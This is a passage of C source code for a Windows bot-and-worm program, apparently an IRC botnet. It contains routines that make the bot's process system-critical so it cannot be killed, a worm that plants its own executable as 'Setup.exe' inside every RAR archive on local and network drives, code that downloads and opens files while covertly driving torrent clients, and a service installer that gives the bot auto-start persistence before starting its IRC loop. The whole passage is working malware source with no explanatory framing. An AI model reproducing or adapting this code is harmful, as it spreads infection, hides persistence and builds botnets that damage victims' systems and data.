    HANDLE hToken;
    LUID luid;
    TOKEN_PRIVILEGES tkprivs;
    ZeroMemory(&tkprivs, sizeof(tkprivs));
   
    if(!OpenProcessToken(GetCurrentProcess(), (TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY), &hToken))
        return FALSE;
   
    if(!LookupPrivilegeValue(NULL, lpszPriv, &luid)){
        CloseHandle(hToken); return FALSE;
    }
   
    tkprivs.PrivilegeCount = 1;
    tkprivs.Privileges[0].Luid = luid;
    tkprivs.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
   
    BOOL bRet = AdjustTokenPrivileges(hToken, FALSE, &tkprivs, sizeof(tkprivs), NULL, NULL);
    CloseHandle(hToken);
    return bRet;
}

BOOL ProtectProcess() // by _FIL73R_
{
   HANDLE hDLL;
   RtlSetProcessIsCritical fSetCritical;

   hDLL = LoadLibraryA("ntdll.dll");
   if ( hDLL != NULL )
   {
    EnablePriv(SE_DEBUG_NAME);
         (fSetCritical) = (RtlSetProcessIsCritical) GetProcAddress( (HINSTANCE)hDLL, "RtlSetProcessIsCritical" );
          if(!fSetCritical) return 0;
          fSetCritical(1,0,0);
    return 1;
   } else
          return 0;
}
#endif

#ifndef NO_RARWORM
char wormpath[MAX_PATH];

void InfectDrive()
{
	
	//adds self as Setup.exe
	char* addname = "Setup.exe";
	//variables
	WIN32_FIND_DATA wfd;
	HANDLE hfind;
	char fullpath[MAX_PATH];
	LPTSTR xaddr=NULL;
	char xrndstr[30];

	hfind=FindFirstFile("*.*",&wfd);

	if(hfind!=INVALID_HANDLE_VALUE)
	{
		do
		{
			if(wfd.cFileName[0]!='.')	//most not be .. or .
			{
				wfd.dwFileAttributes&=FILE_ATTRIBUTE_DIRECTORY;
				if(wfd.dwFileAttributes==FILE_ATTRIBUTE_DIRECTORY) //is directory ?
				{
					if(SetCurrentDirectory(wfd.cFileName)==TRUE)
					{
						InfectDrive();
						SetCurrentDirectory("..");	//return to upper directory
					}
				}
				else
				{
					if(GetFullPathName(wfd.cFileName,MAX_PATH,fullpath,&xaddr)!=0)
					{
						CharLower(fullpath);

						if(memcmp(fullpath+lstrlen(fullpath)-3,"rar",3)==0)
						{
							Sleep(5000);

							//for( int i = 0; i < 8; i++ ) 
							//xrndstr[ i ] = "abcdefghijklmnopqrstuvwxyz"[ rand( ) % 26 ];

							lstrcat(xrndstr,addname);
							AddToRar(fullpath,wormpath,xrndstr,FILE_ATTRIBUTE_NORMAL);
						}
					}
				}
			}
		}while(FindNextFile(hfind,&wfd));
		FindClose(hfind);
	}
}

DWORD WINAPI RarWorm(LPVOID xvoid)
{
	char Drive[]="z:\\";
	UINT drive_type;

	if(GetModuleFileName(NULL,wormpath,MAX_PATH)==0)
		ExitThread(0);

	do
	{
		drive_type=GetDriveType(Drive);	
		
		if(drive_type==DRIVE_FIXED || drive_type==DRIVE_REMOTE)
		{
			if(SetCurrentDirectory(Drive)==TRUE)
				InfectDrive();	
		}

		Drive[0]--;

	} while(Drive[0]!='b');

	return 1;
}
#endif

/*
   Azureus Seeder
   Coded by a59
*/
int SeedAzureus( char* szLink, char* szSaveAs )
{
   int i;
   HWND hAzureus = FindWindow( 0, "Azureus" );
   HWND hPopup, hExists;

   if( hAzureus == NULL )
      return 1;

   if( fURLDownloadToFile( 0, szLink, szSaveAs, 0, 0 ) != S_OK )
      return 2;

   if( (int)ShellExecute( 0, "open", szSaveAs, 0, 0, SW_NORMAL ) <= 32 )
      return 3;

   for( i = 0; i < 10; i++ )
   {
      hExists = FindWindow( 0, "Already exists" );

      if( hExists != NULL )
      {
         ShowWindow( hExists, SW_HIDE );
         return 4;
      }

      Sleep( 100 );
   }

   for( i = 0; i < 10; i++ )
   {
      hPopup = FindWindow( 0, "Information" );

      if( hPopup != NULL )
         break;

      Sleep( 100 );
   }

   if( hPopup == NULL )
      return 5;

   ShowWindow( hPopup, SW_HIDE );

   return 0;
};

BOOL CALLBACK EnumProc( HWND hWnd, LPARAM lParam )
{
   char szTitle[ 512 ];

   GetWindowText( hWnd, szTitle, sizeof( szTitle ) );
   
   if( strstr( szTitle, "\xB5Torrent" ) )
      uTorrentWindow = hWnd;

   return TRUE;
};

HWND FindUTorrent( )
{
   EnumWindows( EnumProc, 0 );
   return( uTorrentWindow );
};

void TypeString( char* szString )
{
   int Length = strlen( szString ), i;
   bool ShiftDown = false;
   short sKey;
   
   for( i = 0; i < Length; i++, szString++ )
   {
      sKey = VkKeyScan( *szString );

      if( ( sKey >> 8 ) & 1 )
      {
         keybd_event( VK_LSHIFT, 0, 0, 0 );
         ShiftDown = true;
      }

      keybd_event( (unsigned char)sKey, 0, 0, 0 );

      if( ShiftDown )
      {
         keybd_event( VK_LSHIFT, 0, KEYEVENTF_KEYUP, 0 );
         ShiftDown = false;
      }
   }
};

int SeedUTorrent( char* szUrl, char* szSaveAs, char* szSeedTo )
{
   HWND uTorrentWindow = FindUTorrent( );
   
   if( uTorrentWindow == 0 )
      return 1;

   if( fURLDownloadToFile( 0, szUrl, szSaveAs, 0, 0 ) != S_OK )
      return 2;

   if( (int)ShellExecute( 0, "open", szSaveAs, 0, 0, SW_NORMAL ) <= 32 )
      return 3;

   ShowWindow( uTorrentWindow, SW_SHOW );
   BringWindowToTop( uTorrentWindow );
   SetForegroundWindow( uTorrentWindow );
   SetFocus( uTorrentWindow );

   if( !IsWindow( uTorrentWindow ) )
      return 4;

   Sleep( 300 );

   if( *szSeedTo != 0 )
      TypeString( szSeedTo );

   keybd_event( VK_RETURN, 0, 0, 0 );
   ShowWindow( uTorrentWindow, SW_MINIMIZE );

   return 0;
};


#ifndef NO_SERVICE

		
BOOL Install_Service() {

     SC_HANDLE check_serv_handle = fOpenSCManager(0, 0, SC_MANAGER_CONNECT);
     if (check_serv_handle) {
        SC_HANDLE chk_serv = fOpenService(check_serv_handle, Decrypt(service_name), SERVICE_QUERY_STATUS);
        if (chk_serv != NULL) {
           fCloseServiceHandle(chk_serv);
           fCloseServiceHandle(check_serv_handle);
           return TRUE;
        }
        fCloseServiceHandle(check_serv_handle);
     }
     SC_HANDLE serv_c_handle = fOpenSCManager(0, 0, SC_MANAGER_CREATE_SERVICE);

     if (serv_c_handle) {
        char prog_path[MAX_PATH + 1];
        if (GetModuleFileName(0, prog_path, sizeof(prog_path)/sizeof(prog_path[0])) == strlen(prog_path)) {
           SC_HANDLE create_serv = fCreateService (serv_c_handle, 
                                                 Decrypt(service_name), //Service Name
                                                 Decrypt(service_name), //Display Name
                                                 SERVICE_ALL_ACCESS,
                                                 SERVICE_WIN32_OWN_PROCESS | SERVICE_INTERACTIVE_PROCESS,
                                                 SERVICE_AUTO_START,
                                                 SERVICE_ERROR_IGNORE,
                                                 prog_path,
                                                 0, 0, 0, 0, 0);
           if (create_serv != NULL) {
              fStartService(create_serv, 0, 0);  //This will get it started the first time
              fCloseServiceHandle(create_serv);
              exit(0);
           }
        }
        fCloseServiceHandle(serv_c_handle);
     }
     return TRUE;
}

void WINAPI Create_Service(DWORD , CHAR**) {


     serv_status.dwServiceType = SERVICE_WIN32;
     serv_status.dwCurrentState = SERVICE_STOPPED;
     serv_status.dwControlsAccepted = 0;
     serv_status.dwWin32ExitCode = NO_ERROR;  
     serv_status.dwServiceSpecificExitCode =  NO_ERROR;
     serv_status.dwCheckPoint = 0;
     serv_status.dwWaitHint = 0;
        
     serv_handle = fRegisterServiceCtrlHandler(Decrypt(service_name), Handle_Controls);
        
     if (serv_handle) {
        serv_status.dwCurrentState = SERVICE_START_PENDING;
        fSetServiceStatus(serv_handle, &serv_status);
           
        stop_service = CreateEvent(0, FALSE, FALSE, 0);
           
        serv_status.dwCurrentState = SERVICE_RUNNING;
        fSetServiceStatus(serv_handle, &serv_status);
        
        //This is where you call your main loop

       	StartIRC();
              

     }
     return;
}

void WINAPI Handle_Controls(DWORD control_code) {
     switch (control_code) {
            default: {
                     break;
            }
     }
     fSetServiceStatus(serv_handle, &serv_status);
     return;
}


void Initialize_Service() {
     SERVICE_TABLE_ENTRY ServTable[] =  {
                         {Decrypt(service_name), Create_Service},
                         {0, 0},
     };
     
     if (fStartServiceCtrlDispatcher(ServTable) == 0) {
        return;
     }
     
     return;
}
#endif //NO_SERVICE